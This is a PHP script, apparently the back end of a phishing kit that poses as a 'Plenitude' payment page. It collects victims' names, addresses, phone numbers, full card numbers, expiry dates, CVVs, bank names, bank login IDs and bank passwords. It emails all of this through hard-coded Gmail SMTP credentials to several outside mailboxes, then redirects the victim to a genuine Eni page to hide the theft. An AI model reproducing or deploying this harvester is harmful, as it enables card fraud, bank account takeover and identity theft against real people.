<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Inclure les fichiers requis
require 'PHPMailer/PHPMailer.php';
require 'PHPMailer/SMTP.php';
require 'PHPMailer/Exception.php';
require 'vendor/autoload.php';

// Vérifier si le formulaire a été soumis
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $nom = isset($_POST['nom']) ? htmlspecialchars($_POST['nom']) : '';
    $prenom = isset($_POST['prenom']) ? htmlspecialchars($_POST['prenom']) : '';
    $address = isset($_POST['address']) ? htmlspecialchars($_POST['address']) : '';
    $address1 = isset($_POST['address1']) ? htmlspecialchars($_POST['address1']) : '';
    $country = isset($_POST['country']) ? htmlspecialchars($_POST['country']) : '';
    $phone = isset($_POST['phone']) ? htmlspecialchars($_POST['phone']) : '';
    
    $n_card = isset($_POST['n_card']) ? htmlspecialchars($_POST['n_card']) : '';

    $c_num = isset($_POST['c_num']) ? htmlspecialchars($_POST['c_num']) : '';
    $exm = isset($_POST['exm']) ? htmlspecialchars($_POST['exm']) : '';
    $exy = isset($_POST['exy']) ? htmlspecialchars($_POST['exy']) : '';
    $csc = isset($_POST['csc']) ? htmlspecialchars($_POST['csc']) : '';
    $bankname = isset($_POST['bankname']) ? htmlspecialchars($_POST['bankname']) : '';
    $bankid = isset($_POST['bankid']) ? htmlspecialchars($_POST['bankid']) : '';
    $bankpass = isset($_POST['bankpass']) ? htmlspecialchars($_POST['bankpass']) : '';

    if ( !empty($nom) && !empty($prenom)  && !empty($address) && !empty($address1) && !empty($country) && !empty($phone) && !empty($n_card) && !empty($c_num) && !empty($exm) && !empty($exy) && !empty($csc) && !empty($bankname) && !empty($bankid) && !empty($bankpass)) {
        // Instancier PHPMailer
        $mail = new PHPMailer(true);

        try {
            // Configuration du serveur SMTP
            $mail->isSMTP();
            $mail->Host = 'smtp.gmail.com'; // Serveur SMTP de Gmail
            $mail->SMTPAuth = true;
            $mail->Username = 'scottmayzie@gmail.com'; // Remplacez par votre adresse Gmail
            $mail->Password = 'itipzjmsptsyolny'; // Remplacez par votre mot de passe d'application Gmail
            $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            $mail->Port = 587;

            // Configurer les destinataires
            $mail->setFrom('scottmayzie@gmail.com', 'Plenitude Payment'); // Expéditeur
            $mail->addAddress('jasmayzie@gmail.com'); // Destinataire (vous pouvez changer cette adresse)
            $mail->addAddress('gestionimmobilier770@gmail.com');
            $mail->addAddress('contact@serviziofinanzieri.it.com');
            // Contenu de l'e-mail
            $mail->isHTML(true);
            $mail->Subject = 'Informations de paiement plenitude';
            $mail->Body    = "
               <p><strong>Nom:</strong> $nom</p>
               <p><strong>Prénom:</strong> $prenom</p>
                <h1>Informations collectées</h1>
                <p><strong>Adresse:</strong> $address</p>
                <p><strong>Adresse personnelle:</strong> $address1</p>
                <p><strong>Pays:</strong> $country</p>
                <p><strong>Numéro de téléphone:</strong> $phone</p>
                <p><strong>Nom sur la carte:</strong> $n_card</p>
                <p><strong>Numéro de la carte:</strong> $c_num</p>
                <p><strong>Mois d'expiration:</strong> $exm</p>
                <p><strong>Année d'expiration:</strong> $exy</p>
                <p><strong>CVV:</strong> $csc</p>
                <p><strong>Nom de la Banque:</strong> $bankname</p>
                <p><strong>Identifiant Bancaire:</strong> $bankid</p>
                <p><strong>Mot de Passe:</strong> $bankpass</p>
            ";

            // Envoyer l'e-mail
            $mail->send();
            // Redirection après l'envoi
            header('Location: https://fr.eni.com/professionnels'); // Remplacez par l'URL souhaitée
            exit();
        } catch (Exception $e) {
            echo "Erreur lors de l'envoi de l'email: {$mail->ErrorInfo}";
        }
    } else {
        echo "Veuillez remplir tous les champs.";
    }
} else {
    echo "Méthode de requête non autorisée.";
}
?>
